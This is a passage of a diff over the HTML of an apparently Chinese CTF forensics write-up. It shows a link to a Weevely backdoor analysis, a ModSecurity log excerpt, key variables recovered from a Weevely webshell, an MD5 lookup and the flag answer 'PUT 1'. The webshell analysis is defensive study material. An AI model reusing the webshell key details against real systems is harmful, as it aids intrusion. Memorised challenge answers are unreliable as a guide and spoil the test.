 <span class="token comment"># 还有一个      https://artikrh.sh/posts/weevely-backdoor-analysis.html</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <blockquote>
 <p>看下具体文件</p>
 </blockquote>
@@ -806,7 +777,6 @@ Server: Apache/2.4.6 <span class="token punctuation">(</span>CentOS<span class="
 Engine-Mode: <span class="token string">"DETECTION_ONLY"</span>
 
 --4b398f30-Z--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <blockquote>
 <p>bohemian师傅说：</p>
 </blockquote>
@@ -814,16 +784,14 @@ Engine-Mode: <span class="token string">"DETECTION_ONLY"</span>
 <span class="token variable">$kf</span> <span class="token operator">=</span> 509a6f75849b
 <span class="token variable">$p</span>  <span class="token operator">=</span> kbPze6iWSynLVEi5
 <span class="token variable">$k</span>  <span class="token operator">=</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
 <pre class="line-numbers language-none"><code class="language-none">cmd5 查询
 
 查询结果：
 md5(1,32) &#x3D; c4ca4238a0b923820dcc509a6f75849b
 md5(1,16) &#x3D; a0b923820dcc509a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag:PUT <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="8-10"><a href="#8-10" class="headerlink" title="8-10"></a>8-10</h2><blockquote>
+<h2 id="section">8-10</h2>
+<blockquote>
 <p>师傅没复现</p>
 </blockquote>
 
